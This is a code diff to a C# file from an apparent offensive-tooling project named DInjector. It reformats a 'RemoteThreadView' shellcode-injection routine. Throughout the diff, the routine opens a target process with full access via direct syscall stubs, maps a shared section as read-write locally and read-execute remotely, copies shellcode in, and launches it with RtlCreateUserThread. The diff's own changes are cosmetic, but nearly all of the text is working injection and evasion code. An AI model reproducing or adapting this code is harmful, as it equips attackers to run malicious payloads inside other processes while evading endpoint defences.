@@ -57,8 +57,7 @@ namespace DInjector
             IntPtr BaseAddress);
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        delegate DI.Data.Native.NTSTATUS NtClose(
-            IntPtr hObject);
+        delegate DI.Data.Native.NTSTATUS NtClose(IntPtr hObject);
 
         [StructLayout(LayoutKind.Sequential, Pack = 0)]
         struct OBJECT_ATTRIBUTES
@@ -117,7 +116,7 @@ namespace DInjector
             IntPtr stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtOpenProcess");
             NtOpenProcess sysNtOpenProcess = (NtOpenProcess)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtOpenProcess));
 
-            IntPtr hProcessR = IntPtr.Zero;
+            IntPtr rhProcess = IntPtr.Zero;
             OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();
 
             CLIENT_ID ci = new CLIENT_ID { UniqueProcess = (IntPtr)processID };
@@ -125,19 +124,15 @@ namespace DInjector
             DI.Data.Native.NTSTATUS ntstatus;
 
             ntstatus = sysNtOpenProcess(
-                ref hProcessR,
+                ref rhProcess,
                 DI.Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_ALL_ACCESS,
                 ref oa,
                 ref ci);
 
             if (ntstatus == 0)
-            {
                 Console.WriteLine("(RemoteThreadView) [+] NtOpenProcess");
-            }
             else
-            {
                 Console.WriteLine($"(RemoteThreadView) [-] NtOpenProcess: {ntstatus}");
-            }
 
             #endregion
 
@@ -161,30 +156,26 @@ namespace DInjector
                 IntPtr.Zero);
 
             if (ntstatus == 0)
-            {
                 Console.WriteLine("(RemoteThreadView) [+] NtCreateSection, PAGE_EXECUTE_READWRITE");
-            }
             else
-            {
                 Console.WriteLine($"(RemoteThreadView) [-] NtCreateSection, PAGE_EXECUTE_READWRITE: {ntstatus}");
-            }
 
             #endregion
 
             #region NtMapViewOfSection (PAGE_READWRITE)
 
-            // Map the view of created section into the LOCAL process's virtual address space (as R-W)
+            // Map the view of created section into the LOCAL process's virtual address space (as RW)
 
             stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtMapViewOfSection");
             NtMapViewOfSection sysNtMapViewOfSection = (NtMapViewOfSection)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtMapViewOfSection));
 
-            var hProcessL = Process.GetCurrentProcess().Handle;
-            var baseAddressL = IntPtr.Zero;
+            var lhProcess = Process.GetCurrentProcess().Handle;
+            var lbaseAddress = IntPtr.Zero;
 
             ntstatus = sysNtMapViewOfSection(
                 hSection,
-                hProcessL,
-                ref baseAddressL,
+                lhProcess,
+                ref lbaseAddress,
                 UIntPtr.Zero,
                 UIntPtr.Zero,
                 out ulong _,
@@ -194,26 +185,22 @@ namespace DInjector
                 DI.Data.Win32.WinNT.PAGE_READWRITE);
 
             if (ntstatus == 0)
-            {
                 Console.WriteLine("(RemoteThreadView) [+] NtMapViewOfSection, PAGE_READWRITE");
-            }
             else
-            {
                 Console.WriteLine($"(RemoteThreadView) [-] NtMapViewOfSection, PAGE_READWRITE: {ntstatus}");
-            }
 
             #endregion
 
             #region NtMapViewOfSection (PAGE_EXECUTE_READ)
 
-            // Map the view of (the same) created section into the REMOTE process's virtual address space (as R-E)
+            // Map the view of (the same) created section into the REMOTE process's virtual address space (as RX)
 
-            var baseAddressR = IntPtr.Zero;
+            var rbaseAddress = IntPtr.Zero;
 
             ntstatus = sysNtMapViewOfSection(
                 hSection,
-                hProcessR,
-                ref baseAddressR,
+                rhProcess,
+                ref rbaseAddress,
                 UIntPtr.Zero,
                 UIntPtr.Zero,
                 out ulong _,
@@ -223,16 +210,12 @@ namespace DInjector
                 DI.Data.Win32.WinNT.PAGE_EXECUTE_READ);
 
             if (ntstatus == 0)
-            {
                 Console.WriteLine("(RemoteThreadView) [+] NtMapViewOfSection, PAGE_EXECUTE_READ");
-            }
             else
-            {
                 Console.WriteLine($"(RemoteThreadView) [-] NtMapViewOfSection, PAGE_EXECUTE_READ: {ntstatus}");
-            }
 
             // Copy the shellcode into the locally mapped view which will be reflected on the remotely mapped view
-            Marshal.Copy(shellcode, 0, baseAddressL, shellcode.Length);
+            Marshal.Copy(shellcode, 0, lbaseAddress, shellcode.Length);
 
             #endregion
 
@@ -246,25 +229,21 @@ namespace DInjector
             IntPtr hThread = IntPtr.Zero;
 
             ntstatus = rtlCreateUserThread(
-                hProcessR,
+                rhProcess,
                 IntPtr.Zero,
                 false, // CreateSuspended
                 0, // StackZeroBits
                 IntPtr.Zero,
                 IntPtr.Zero,
-                baseAddressR,
+                rbaseAddress,
                 IntPtr.Zero,
                 ref hThread,
                 IntPtr.Zero);
 
             if (ntstatus == 0)
-            {
                 Console.WriteLine("(RemoteThreadView) [+] RtlCreateUserThread");
-            }
             else
-            {
                 Console.WriteLine($"(RemoteThreadView) [-] RtlCreateUserThread: {ntstatus}");
-            }
 
             #endregion
 
@@ -274,14 +253,13 @@ namespace DInjector
             NtUnmapViewOfSection sysNtUnmapViewOfSection = (NtUnmapViewOfSection)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtUnmapViewOfSection));
 
             sysNtUnmapViewOfSection(
-                hProcessL,
-                baseAddressL);
+                lhProcess,
+                lbaseAddress);
 
             stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtClose");
             NtClose sysNtClose = (NtClose)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtClose));
 
-            sysNtClose(
-                hSection);
+            sysNtClose(hSection);
 
             #endregion
         }
